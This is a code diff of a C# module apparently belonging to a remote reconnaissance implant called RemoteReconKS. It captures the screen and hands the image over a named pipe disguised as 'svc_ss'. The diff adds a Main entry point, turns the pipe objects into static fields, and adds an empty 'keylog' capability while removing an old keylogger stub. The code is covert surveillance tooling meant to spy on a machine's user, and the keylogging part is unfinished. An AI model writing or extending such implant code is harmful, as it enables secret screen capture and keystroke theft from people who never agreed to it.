@@ -5,19 +5,33 @@ using System.Windows.Forms;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.Threading;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
 
 namespace RemoteReconKS
 {
     public class RemoteReconKS
     {
 
+        private static NamedPipeServerStream server;
+        private static StreamWriter sw;
+
+        public static void Main(string[] arg)
+        {
+#if DEBUG
+            Execute("screenshot");
+#else
+#endif
+        }
+
         public static void Execute(string capability)
         {
             if (capability.ToLower() == "screenshot")
             {
-                NamedPipeServerStream server = new NamedPipeServerStream("svc_ss", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
+                server = new NamedPipeServerStream("svc_ss", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
                 server.WaitForConnection();
-                StreamWriter sw = new StreamWriter(server);
+                sw = new StreamWriter(server);
 
                 //byte[] image = screenshot();
                 sw.WriteLine(screenshot());
@@ -26,11 +40,14 @@ namespace RemoteReconKS
 
                 server.Close();
             }
+            else if(capability.ToLower() == "keylog")
+            {
+                
+            }
         }
 
         public static string screenshot()
         {
-            //byte[] rawImage = new byte[1] { 0 };
 
             try
             {
@@ -53,15 +70,5 @@ namespace RemoteReconKS
             }
         }
 
-        public void keylogger()
-        {
-            //Keylogger code here
-        }
-
-        public void exit()
-        {
-            //exit
-            System.Environment.Exit(0);
-        }
     }
 }
